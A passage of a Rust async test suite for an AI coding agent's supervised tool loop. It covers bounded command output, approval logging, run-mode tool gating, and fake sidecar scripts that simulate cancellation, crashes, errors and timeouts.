            } if tool_call_id == "cmd_evidence" => Some((
                command_label,
                executable,
                timeout_sec,
                reason,
                expected_effect,
                success,
                exit_code,
                stdout_summary,
            )),
            _ => None,
        })
        .expect("project command evidence event");
    assert!(command_event.0.starts_with("printf "));
    assert_eq!(command_event.1, "printf");
    assert_eq!(*command_event.2, 5);
    assert_eq!(
        command_event.3.as_deref(),
        Some("Run the direct verification command.")
    );
    assert_eq!(
        command_event.4.as_deref(),
        Some("Prints bounded output without shell expansion.")
    );
    assert!(*command_event.5);
    assert_eq!(*command_event.6, Some(0));
    assert!(
        command_event
            .7
            .as_deref()
            .is_some_and(|value| value.contains("[truncated]")),
        "stdout summary should be bounded"
    );

    let db_guard = db.lock().unwrap();
    let rows = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id).unwrap();
    let logged = rows
        .iter()
        .find(|row| row.r#type == crate::dive::event_log::PROJECT_COMMAND_RESULT_EVENT)
        .expect("project_command.result log");
    assert_eq!(
        logged.payload["commandLabel"].as_str(),
        Some(command_event.0.as_str())
    );
    assert_eq!(logged.payload["timeoutSec"].as_u64(), Some(5));
    assert_eq!(
        logged.payload["expectedEffect"].as_str(),
        Some("Prints bounded output without shell expansion.")
    );
}

#[tokio::test]
#[cfg(unix)]
async fn supervised_terminal_script_logs_one_shot_approval_and_bounded_result() {
    let project = tempfile::tempdir().unwrap();
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let tc = tool_call(
        "script_evidence",
        "run_terminal_script",
        json!({
            "script": "printf '%0300d' 1; printf warn >&2",
            "shell_family": "posix",
            "reason": "Need shell sequencing for a bounded verification fixture.",
            "expected_effect": "Captures stdout and stderr without editing files.",
            "timeout_sec": 30,
            "output_limit": 256
        }),
    );
    let mut events = Vec::new();
    let out = loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |event| events.push(event))
        .await
        .unwrap();
    assert!(out.success, "terminal script failed: {}", out.summary);
    assert_eq!(out.full["runtimeAction"], "terminal_script");
    assert_eq!(out.full["truncated"], true);
    assert!(events.iter().any(
        |event| matches!(event, AgentEvent::ToolCallApproved { id } if id == "script_evidence")
    ));

    let script_event = events
        .iter()
        .find_map(|event| match event {
            AgentEvent::TerminalScriptResult {
                tool_call_id,
                success,
                exit_code,
                stdout_summary,
                stderr_summary,
                truncated,
                ..
            } if tool_call_id == "script_evidence" => Some((
                success,
                exit_code,
                stdout_summary,
                stderr_summary,
                truncated,
            )),
            _ => None,
        })
        .expect("terminal_script.result event");
    assert!(*script_event.0);
    assert_eq!(*script_event.1, Some(0));
    assert!(
        script_event
            .2
            .as_deref()
            .is_some_and(|value| value.contains("[truncated]")),
        "stdout should be bounded"
    );
    assert_eq!(script_event.3.as_deref(), Some("warn"));
    assert!(*script_event.4);

    let db_guard = db.lock().unwrap();
    let rows = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id).unwrap();
    let approval = rows
        .iter()
        .find(|row| row.r#type == crate::dive::event_log::TERMINAL_SCRIPT_APPROVAL_REQUESTED_EVENT)
        .expect("terminal_script.approval_requested log");
    assert_eq!(approval.payload["oneShot"], true);
    assert_eq!(approval.payload["approvalReuse"], false);
    assert_eq!(approval.payload["shellFamily"].as_str(), Some("posix"));
    assert_eq!(
        approval.payload["reason"].as_str(),
        Some("Need shell sequencing for a bounded verification fixture.")
    );
    assert_eq!(
        approval.payload["expectedEffect"].as_str(),
        Some("Captures stdout and stderr without editing files.")
    );

    let result = rows
        .iter()
        .find(|row| row.r#type == crate::dive::event_log::TERMINAL_SCRIPT_RESULT_EVENT)
        .expect("terminal_script.result log");
    assert_eq!(
        result.payload["toolCallId"].as_str(),
        Some("script_evidence")
    );
    assert_eq!(result.payload["truncated"], true);
}

#[tokio::test]
async fn supervised_run_process_reroutes_preview_open_before_approval() {
    let project = tempfile::tempdir().unwrap();
    std::fs::write(project.path().join("index.html"), "<h1>Preview</h1>").unwrap();
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let tc = tool_call(
        "preview_reroute",
        "run_process",
        json!({ "command": "open", "args": ["index.html"], "timeout_sec": 5 }),
    );
    let mut events = Vec::new();
    let out = loop_
        .execute_supervised_tool_call(session_id, &tc, &mut |event| events.push(event))
        .await
        .unwrap();

    assert!(!out.success);
    assert_eq!(out.full["commandRan"], false);
    assert!(
        !events.iter().any(
            |event| matches!(event, AgentEvent::ToolCallApproved { id } if id == "preview_reroute")
        ),
        "preview-open workaround must not reach approval"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::RuntimeRoutingDecision {
            tool_call_id: Some(id),
            outcome: crate::tools::runtime::RuntimeRoutingOutcome::Rerouted,
            reason_code,
            ..
        } if id == "preview_reroute" && reason_code == "preview_open_shell_workaround"
    )));
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::ProjectCommandResult {
            tool_call_id,
            status,
            success,
            summary,
            ..
        } if tool_call_id == "preview_reroute"
            && status == "blocked"
            && !success
            && summary.contains("DIVE did not run")
    )));

    let db_guard = db.lock().unwrap();
    let rows = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id).unwrap();
    assert!(rows.iter().any(|row| row.r#type
        == crate::dive::event_log::RUNTIME_ROUTING_DECISION_EVENT
        && row.payload["outcome"] == "rerouted"
        && row.payload["commandRan"] == false));
    assert!(rows.iter().any(|row| row.r#type
        == crate::dive::event_log::PROJECT_COMMAND_RESULT_EVENT
        && row.payload["summary"]
            .as_str()
            .is_some_and(|summary| summary.contains("DIVE did not run"))));
}

#[tokio::test]
async fn pi_path_run_mode_gating_preserves_interview_plan_and_build_rules() {
    let project = tempfile::tempdir().unwrap();

    let (interview_db, interview_session) = create_test_db(project.path());
    let interview_loop = make_loop(
        project.path(),
        interview_db,
        interview_session,
        AgentRunMode::Interview,
        run_mode_permission(
            AgentRunMode::Interview,
            false,
            None,
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    assert!(
        interview_loop.tool_defs_for_external_turn().is_empty(),
        "Interview mode must send no tools to Pi"
    );

    let (plan_db, plan_session) = create_test_db(project.path());
    let plan_loop = make_loop(
        project.path(),
        plan_db,
        plan_session,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    assert!(
        !plan_loop
            .tool_defs_for_external_turn()
            .iter()
            .any(|tool| tool.name == "web_fetch"),
        "Plan mode must not expose web_fetch to Pi"
    );
    let plan_write = tool_call(
        "plan_write",
        "write_file",
        json!({ "path": "plan-blocked.txt", "content": "no" }),
    );
    let mut plan_events = Vec::new();
    let plan_out = plan_loop
        .execute_supervised_tool_call(plan_session, &plan_write, &mut |event| {
            plan_events.push(event)
        })
        .await
        .unwrap();
    assert!(!plan_out.success);
    assert!(!project.path().join("plan-blocked.txt").exists());
    assert!(plan_events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolCallDenied { id, reason }
            if id == "plan_write" && reason.contains("plan-first")
    )));

    let (build_db, build_session) = create_test_db(project.path());
    let build_loop = make_loop(
        project.path(),
        build_db,
        build_session,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            false,
            None,
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    assert!(
        build_loop
            .tool_defs_for_external_turn()
            .iter()
            .any(|tool| tool.name == "web_fetch"),
        "Build mode should expose web_fetch to Pi"
    );
    let build_write = tool_call(
        "build_write_blocked",
        "write_file",
        json!({ "path": "build-blocked.txt", "content": "no" }),
    );
    let mut build_events = Vec::new();
    let build_out = build_loop
        .execute_supervised_tool_call(build_session, &build_write, &mut |event| {
            build_events.push(event)
        })
        .await
        .unwrap();
    assert!(!build_out.success);
    assert!(!project.path().join("build-blocked.txt").exists());
    assert!(build_events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolCallDenied { id, reason }
            if id == "build_write_blocked" && reason.contains("approved plan with an active step")
    )));

    let calls = Arc::new(AtomicUsize::new(0));
    let (allowed_db, allowed_session) = create_test_db(project.path());
    let allowed_loop = make_loop(
        project.path(),
        allowed_db,
        allowed_session,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(123),
            Arc::new(RecordingApproveHook {
                calls: calls.clone(),
            }),
        ),
        None,
    );
    let allowed_write = tool_call(
        "build_write_allowed",
        "write_file",
        json!({ "path": "build-allowed.txt", "content": "yes" }),
    );
    let mut allowed_events = Vec::new();
    let allowed_out = allowed_loop
        .execute_supervised_tool_call(allowed_session, &allowed_write, &mut |event| {
            allowed_events.push(event)
        })
        .await
        .unwrap();
    assert!(allowed_out.success);
    assert_eq!(calls.load(Ordering::SeqCst), 1);
    assert_eq!(
        std::fs::read_to_string(project.path().join("build-allowed.txt")).unwrap(),
        "yes"
    );
    assert!(allowed_events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolCallApproved { id } if id == "build_write_allowed"
    )));
}

#[tokio::test]
async fn supervised_write_and_edit_record_card_changed_files_without_checkpoint() {
    let project = tempfile::tempdir().unwrap();
    let (db, session_id) = create_test_db(project.path());
    let card_id = insert_current_card(&db, session_id, "changed-files");
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );

    let write = tool_call(
        "write_changed_file",
        "write_file",
        json!({ "path": "src/phase-d.txt", "content": "old" }),
    );
    let edit = tool_call(
        "edit_changed_file",
        "edit_file",
        json!({ "path": "src/phase-d.txt", "find": "old", "replace": "new" }),
    );
    let mut events = Vec::new();
    let write_out = loop_
        .execute_supervised_tool_call(session_id, &write, &mut |event| events.push(event))
        .await
        .unwrap();
    let edit_out = loop_
        .execute_supervised_tool_call(session_id, &edit, &mut |event| events.push(event))
        .await
        .unwrap();
    assert!(write_out.success);
    assert!(edit_out.success);
    assert_eq!(
        std::fs::read_to_string(project.path().join("src/phase-d.txt")).unwrap(),
        "new"
    );

    let db_guard = db.lock().unwrap();
    let card = crate::db::dao::card::get_by_id(db_guard.conn(), card_id)
        .unwrap()
        .unwrap();
    assert_eq!(
        card.changed_files,
        Some(json!([{
            "path": "src/phase-d.txt",
            "diff": {
                "path": "src/phase-d.txt",
                "before": "",
                "after": "old"
            }
        }]))
    );
    let logs = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id).unwrap();
    assert_eq!(
        logs.iter()
            .filter(|row| row.r#type == "card_changed_files")
            .count(),
        2
    );
    assert!(logs.iter().any(|row| {
        row.r#type == "card_changed_files"
            && row.payload["paths"] == json!(["src/phase-d.txt"])
            && row.payload["card_id"] == json!(card_id)
    }));
    assert!(
        crate::db::dao::checkpoint::list_by_session(db_guard.conn(), session_id)
            .unwrap()
            .is_empty(),
        "tool execution must not create auto checkpoints; card transitions own that timing"
    );
}

#[tokio::test]
async fn sidecar_cancel_during_streaming_marks_state_cancelled_and_preserves_db() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "stream-cancel.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  emit({{ type: "assistant_delta", request_id: message.request_id, delta: "partial" }});
  setInterval(() => {{}}, 1000);
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let (db, session_id) = create_test_db(project.path());
    let cancel = Arc::new(AtomicBool::new(false));
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        Some(cancel.clone()),
    );
    let provider_config_id = 501;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let cancel_task = tokio::spawn({
        let cancel = cancel.clone();
        async move {
            tokio::time::sleep(Duration::from_millis(100)).await;
            cancel.store(true, Ordering::SeqCst);
        }
    });

    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "cancel during streaming",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();
    cancel_task.await.unwrap();

    assert!(
        matches!(err, AgentError::Cancelled),
        "unexpected cancel result: {err:?}"
    );
    let state_path = runtime_state_path(state_root.path(), session_id);
    let state: PiRuntimeState =
        serde_json::from_slice(&std::fs::read(&state_path).unwrap()).unwrap();
    assert_eq!(state.status, "cancelled");
    assert_eq!(state.tool_calls_seen, 0);
    assert!(!std::fs::read_to_string(&state_path)
        .unwrap()
        .contains("sk-test-secret"));
    let db_guard = db.lock().unwrap();
    let messages =
        crate::db::dao::message::list_by_session(db_guard.conn(), session_id, 100).unwrap();
    assert_eq!(messages.len(), 1);
    assert_eq!(messages[0].role, "user");
}

#[tokio::test]
async fn sidecar_crash_after_mutation_does_not_auto_replay_on_next_turn() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let crash_script = write_fake_sidecar(
        scripts.path(),
        "crash-after-tool.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "run") {{
    ready(message);
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "mutating_call",
      name: "write_file",
      params: {{ path: "replay.txt", content: "once" }}
    }});
  }} else if (message.type === "tool_result") {{
    process.exit(1);
  }}
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let success_script = write_fake_sidecar(
        scripts.path(),
        "success-no-tool.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  emit({{ type: "assistant_delta", request_id: message.request_id, delta: "recovered" }});
  emit({{ type: "turn_succeeded", request_id: message.request_id, assistant_text: "recovered" }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );

    let (db, session_id) = create_test_db(project.path());
    insert_current_card(&db, session_id, "no-replay");
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(AlwaysApproveHook),
        ),
        None,
    );
    let provider_config_id = 502;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();

    {
        let _guard = set_test_sidecar_script_path(crash_script);
        let mut events = Vec::new();
        let err = run_supervised_turn(
            &keyring,
            &api_key_descriptor(),
            provider_config_id,
            &loop_,
            session_id,
            "run a mutating tool then crash",
            Some(state_root.path().to_path_buf()),
            &mut |event| events.push(event),
        )
        .await
        .unwrap_err();
        assert!(
            matches!(err, AgentError::Internal(message) if message.contains("pi sidecar exited"))
        );
        assert!(events.iter().any(|event| matches!(
            event,
            AgentEvent::ToolResult { call_id, success: true, .. } if call_id == "mutating_call"
        )));
    }

    assert_eq!(
        std::fs::read_to_string(project.path().join("replay.txt")).unwrap(),
        "once"
    );
    let first_state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .expect("synthetic sidecar event parity turn");
    assert_eq!(first_state.status, "crashed");
    assert_eq!(first_state.tool_calls_seen, 1);

    {
        let _guard = set_test_sidecar_script_path(success_script);
        let mut events = Vec::new();
        let result = run_supervised_turn(
            &keyring,
            &api_key_descriptor(),
            provider_config_id,
            &loop_,
            session_id,
            "recover without replay",
            Some(state_root.path().to_path_buf()),
            &mut |event| events.push(event),
        )
        .await
        .unwrap();
        assert_eq!(result.tool_calls_seen, 0);
        assert_eq!(result.assistant_text, "recovered");
        assert!(!events.iter().any(|event| matches!(
            event,
            AgentEvent::ToolCallStart { id, .. } if id == "mutating_call"
        )));
    }

    assert_eq!(
        std::fs::read_to_string(project.path().join("replay.txt")).unwrap(),
        "once"
    );
    let db_guard = db.lock().unwrap();
    let tool_result_logs = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id)
        .unwrap()
        .into_iter()
        .filter(|row| row.r#type == "tool_result")
        .count();
    assert_eq!(tool_result_logs, 1);
}

#[tokio::test]
async fn synthetic_sidecar_events_map_to_legacy_agent_event_surface() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    std::fs::write(project.path().join("phase-d.txt"), "sidecar input").unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "event-parity.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "run") {{
    ready(message);
    emit({{ type: "reasoning_delta", request_id: message.request_id, delta: "think " }});
    emit({{ type: "assistant_delta", request_id: message.request_id, delta: "before " }});
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "read_call",
      name: "read_file",
      params: {{ path: "phase-d.txt" }}
    }});
  }} else if (message.type === "tool_result") {{
    emit({{ type: "tool_call_end", request_id: "event-parity", tool_call_id: message.tool_call_id }});
    emit({{ type: "assistant_delta", request_id: "event-parity", delta: "after" }});
    emit({{ type: "turn_succeeded", request_id: "event-parity", assistant_text: "before after" }});
  }}
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    let provider_config_id = 503;
    let keyring = api_keyring(provider_config_id);
    let mut events = Vec::new();
    let result = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "feed synthetic sidecar events",
        None,
        &mut |event| events.push(event),
    )
    .await
    .unwrap();

    assert_eq!(result.assistant_text, "before after");
    assert_eq!(result.tool_calls_seen, 1);
    assert_eq!(
        event_kinds(&events),
        vec![
            "user_message",
            "assistant_start",
            "agent_progress",
            "assistant_delta",
            "agent_progress",
            "reasoning",
            "tool_call_start",
            "tool_call_approved",
            "tool_result",
            "assistant_delta",
            "assistant_end",
            // 011 live-QA fix: the supervised path now closes every
            // successful turn with the terminal `done` the frontend's
            // stall latch keys on (재QA 재저니 3-D regression lock).
            "done",
        ]
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolResult { call_id, success: true, .. } if call_id == "read_call"
    )));
    let db_guard = db.lock().unwrap();
    let messages =
        crate::db::dao::message::list_by_session(db_guard.conn(), session_id, 100).unwrap();
    let assistant = messages
        .iter()
        .find(|message| message.role == "assistant")
        .unwrap();
    assert_eq!(assistant.content, "before after");
    assert_eq!(assistant.reasoning_content.as_deref(), Some("think"));

    let mapped_reasoning = map_sidecar_delta_event(
        &serde_json::from_value::<SidecarEvent>(json!({
            "type": "reasoning_delta",
            "delta": "hidden"
        }))
        .unwrap(),
        "assistant",
    );
    assert!(
        mapped_reasoning.is_none(),
        "reasoning deltas must not create extra UI AgentEvents compared with legacy streaming"
    );
}

#[tokio::test]
async fn sidecar_tool_calls_arriving_during_tool_execution_are_buffered() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    std::fs::write(project.path().join("first.txt"), "one").unwrap();
    std::fs::write(project.path().join("second.txt"), "two").unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "queued-tool-calls.mjs",
        &format!(
            r#"{}
let resultsSeen = 0;
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "run") {{
    ready(message);
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "first_read",
      name: "read_file",
      params: {{ path: "first.txt" }}
    }});
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "second_read",
      name: "read_file",
      params: {{ path: "second.txt" }}
    }});
  }} else if (message.type === "tool_result") {{
    resultsSeen += 1;
    emit({{ type: "tool_call_end", request_id: "queued-tool-calls", tool_call_id: message.tool_call_id }});
    if (resultsSeen === 2) {{
      emit({{ type: "assistant_delta", request_id: "queued-tool-calls", delta: "done" }});
      emit({{ type: "turn_succeeded", request_id: "queued-tool-calls", assistant_text: "done" }});
    }}
  }}
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(
            AgentRunMode::Plan,
            false,
            None,
            Arc::new(DelayedApproveHook {
                delay: Duration::from_millis(50),
            }),
        ),
        None,
    );
    let provider_config_id = 504;
    let keyring = api_keyring(provider_config_id);
    let mut events = Vec::new();
    let result = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "read two files",
        None,
        &mut |event| events.push(event),
    )
    .await
    .unwrap();

    assert_eq!(result.assistant_text, "done");
    assert_eq!(result.tool_calls_seen, 2);
    let tool_results = events
        .iter()
        .filter(|event| matches!(event, AgentEvent::ToolResult { success: true, .. }))
        .count();
    assert_eq!(tool_results, 2);
}

#[tokio::test]
async fn sidecar_error_event_emits_retryable_agent_error_and_error_state() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "error-event.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  emit({{ type: "error", request_id: message.request_id, message: "synthetic sidecar failure" }});
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    let provider_config_id = 504;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "error mapping",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();
    assert!(
        matches!(err, AgentError::Internal(ref message) if message.contains("synthetic sidecar failure")),
        "unexpected sidecar error mapping result: {err:?}"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::Error { message, retryable: true }
            if message.contains("synthetic sidecar failure")
    )));
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "error");
    assert!(state
        .error
        .as_deref()
        .unwrap_or("")
        .contains("synthetic sidecar failure"));
}

#[tokio::test]
async fn sidecar_heartbeat_stall_is_retryable_runtime_error_and_error_state() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "heartbeat-stall.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  setInterval(() => {{}}, 1000);
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let _timing = set_test_sidecar_timing(Duration::from_secs(2), Duration::from_millis(100));
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    let provider_config_id = 505;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "stall without heartbeat",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();

    assert!(
        matches!(err, AgentError::Internal(ref message) if message.contains("heartbeat stalled")),
        "unexpected heartbeat stall result: {err:?}"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::Error { message, retryable: true } if message.contains("heartbeat stalled")
    )));
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "error");
    assert!(state
        .error
        .as_deref()
        .unwrap_or("")
        .contains("heartbeat stalled"));
}

#[tokio::test]
async fn long_pi_turn_with_heartbeats_is_bounded_by_turn_timeout() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "heartbeat-timeout.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  setInterval(() => emit({{ type: "heartbeat", request_id: message.request_id, ts: Date.now() }}), 20);
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    // turn_timeout comfortably above CI process-spawn + first-heartbeat
    // latency so at least one heartbeat is reliably observed before the
    // bound fires (250ms flaked on loaded CI runners); still < the 5s
    // assertion below and far below the 60s heartbeat-stall timeout, so the
    // turn is bounded by turn_timeout, not by heartbeat stall.
    let _timing = set_test_sidecar_timing(Duration::from_secs(2), Duration::from_secs(60));
    let (db, session_id) = create_test_db(project.path());
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        None,
    );
    let provider_config_id = 506;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let started = Instant::now();
    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "keep running until bounded",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();

    assert!(
        started.elapsed() < Duration::from_secs(5),
        "turn timeout test exceeded expected bound"
    );
    assert!(
        matches!(err, AgentError::Internal(ref message) if message.contains("turn timed out")),
        "unexpected turn timeout result: {err:?}"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::AgentProgress {
            kind: AgentProgressKind::Heartbeat,
            ..
        }
    )));
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "error");
    assert!(state
        .error
        .as_deref()
        .unwrap_or("")
        .contains("turn timed out"));
}

#[tokio::test]
async fn slow_human_approval_does_not_expire_the_turn_budget() {
    // Regression for Critical-5 (2026-06-10): the 120s Pi turn budget used to
    // include human approval time, so a student deliberating on a permission
    // card past the budget killed the turn and discarded the approved write.
    // Here the turn budget is 200ms but the approval takes 600ms; the turn
    // must still succeed and the file must be written.
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "slow-approval.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "run") {{
    ready(message);
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "slow_call",
      name: "write_file",
      params: {{ path: "slow.txt", content: "approved" }}
    }});
  }} else if (message.type === "tool_result") {{
    emit({{ type: "turn_succeeded", request_id: message.request_id, assistant_text: "done" }});
  }}
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    // Tiny turn budget, generous heartbeat-stall so only the budget could
    // (wrongly) fire during the approval wait.
    let _timing = set_test_sidecar_timing(Duration::from_millis(200), Duration::from_secs(60));
    let (db, session_id) = create_test_db(project.path());
    insert_current_card(&db, session_id, "slow-approval");
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(1),
            Arc::new(SlowApproveHook {
                delay: Duration::from_millis(600),
            }),
        ),
        None,
    );
    let provider_config_id = 507;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let mut events = Vec::new();
    let result = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "write a file but approve slowly",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .expect("slow approval should not time out the turn");

    assert_eq!(result.tool_calls_seen, 1);
    assert_eq!(
        std::fs::read_to_string(project.path().join("slow.txt")).unwrap(),
        "approved"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolResult { call_id, success: true, .. } if call_id == "slow_call"
    )));
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "completed");
}

#[tokio::test]
async fn long_pi_turn_with_heartbeats_is_cancellable_mid_turn() {
